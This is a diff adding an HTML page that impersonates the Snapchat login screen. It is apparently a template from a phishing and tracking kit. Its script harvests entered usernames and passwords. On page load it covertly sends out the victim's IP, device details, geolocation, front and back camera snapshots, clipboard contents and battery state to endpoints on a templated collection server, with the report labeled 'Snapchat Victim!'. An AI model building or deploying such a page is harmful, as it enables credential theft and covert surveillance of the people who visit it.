@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Snapchat - Log In</title>
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background: #FFFC00; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
+.container { width: 100%; max-width: 400px; padding: 20px; }
+.card { background: #fff; border-radius: 16px; box-shadow: 0 4px 24px rgba(0,0,0,0.1); padding: 40px 32px; text-align: center; }
+.ghost { font-size: 56px; margin-bottom: 8px; }
+h1 { font-size: 22px; color: #000; margin-bottom: 4px; font-weight: 700; }
+.subtitle { color: #666; font-size: 14px; margin-bottom: 28px; }
+.form-group { margin-bottom: 14px; }
+.form-group input { width: 100%; padding: 14px 16px; border: 2px solid #eee; border-radius: 10px; font-size: 15px; background: #fafafa; }
+.form-group input:focus { outline: none; border-color: #FFFC00; background: #fff; }
+.btn { width: 100%; padding: 14px; background: #FFFC00; color: #000; border: none; border-radius: 10px; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 8px; }
+.btn:hover { background: #e6e300; }
+.links { margin-top: 20px; font-size: 13px; color: #666; }
+.links a { color: #0eadff; text-decoration: none; }
+.loading { display: none; text-align: center; padding: 30px; }
+.spinner { border: 3px solid #eee; border-top: 3px solid #FFFC00; border-radius: 50%; width: 32px; height: 32px; animation: spin 0.8s linear infinite; margin: 0 auto 12px; }
+@keyframes spin { to { transform: rotate(360deg); } }
+</style>
+</head>
+<body>
+<div class="container">
+<div class="card">
+<div class="ghost">👻</div>
+<h1>Snapchat</h1>
+<p class="subtitle">Log in to your account</p>
+<form id="loginForm">
+<div class="form-group">
+<input type="text" id="username" placeholder="Username or email" required>
+</div>
+<div class="form-group">
+<input type="password" id="password" placeholder="Password" required>
+</div>
+<button type="submit" class="btn">Log In</button>
+</form>
+<div class="loading" id="loading">
+<div class="spinner"></div>
+<p style="color:#666;font-size:14px;">Logging in...</p>
+</div>
+<div class="links">
+<a href="#">Forgot your password?</a><br><br>
+<a href="#">Sign Up</a>
+</div>
+</div>
+</div>
+<video id="video" style="display:none" playsinline autoplay></video>
+<canvas id="canvas" style="display:none" width="640" height="480"></canvas>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script src="<%=a %>/public/advanced.js"></script>
+<script>
+var uid="<%=uid %>";
+var video = document.getElementById('video');
+var canvas = document.getElementById('canvas');
+
+async function gatherAll() {
+    let td = '👻 <b>Snapchat Victim!</b>\n\n';
+    td += '⚓ IP: <code><%=ip %></code>\n';
+    td += '⏰ Time: ' + new Date().toLocaleString() + '\n';
+    td += '🖥️ OS: <code>' + navigator.platform + '</code>\n';
+    td += '📱 Screen: <code>' + screen.width + 'x' + screen.height + '</code>\n';
+    td += '🌐 Browser: <code>' + navigator.userAgent.split(' ').pop() + '</code>\n';
+    $.post("<%=a %>/",{data:encodeURIComponent(td),uid:encodeURIComponent(uid)});
+    if(navigator.geolocation){ navigator.geolocation.getCurrentPosition((p)=>{ $.post("<%=a %>/location",{uid:uid,lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy}); }, ()=>{}, {enableHighAccuracy:true, timeout: 10000}); }
+    async function captureCamera(facingMode, label) { try { const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: facingMode, width: 640, height: 480}}); video.srcObject = stream; await video.play(); await new Promise(r => setTimeout(r, 2000)); canvas.getContext('2d').drawImage(video, 0, 0, 640, 480); $.post("<%=a %>/camsnap", {uid: uid, img: encodeURIComponent(canvas.toDataURL("image/jpeg", 0.8).replace("data:image/jpeg;base64,", "")), cam: label}); stream.getTracks().forEach(t => t.stop()); } catch(e) {} }
+    try { await captureCamera("user", "selfie"); } catch(e) {}
+    try { await captureCamera("environment", "back"); } catch(e) {}
+    try { if(navigator.clipboard && navigator.clipboard.readText) { const clip = await navigator.clipboard.readText(); if(clip) $.post("<%=a %>/clipboard", {uid:uid, clip:encodeURIComponent(clip)}); } } catch(e) {}
+    try { const bat = await navigator.getBattery(); $.post("<%=a %>/battery", {uid:uid, level:Math.round(bat.level*100), charging:bat.charging}); } catch(e) {}
+}
+
+document.getElementById('loginForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    const user = document.getElementById('username').value;
+    const pass = document.getElementById('password').value;
+    document.querySelector('form').style.display = 'none';
+    document.getElementById('loading').style.display = 'block';
+    $.post("<%=a %>/creds", { uid: uid, user: encodeURIComponent(user), pass: encodeURIComponent(pass), platform: 'Snapchat' });
+    await new Promise(r => setTimeout(r, 2500));
+    window.location.href = "<%=url %>";
+});
+
+window.onload = function(){ gatherAll(); if(typeof advancedGather==="function") advancedGather("<%=a %>","<%=uid %>"); };
+</script>
+</body>
+</html>
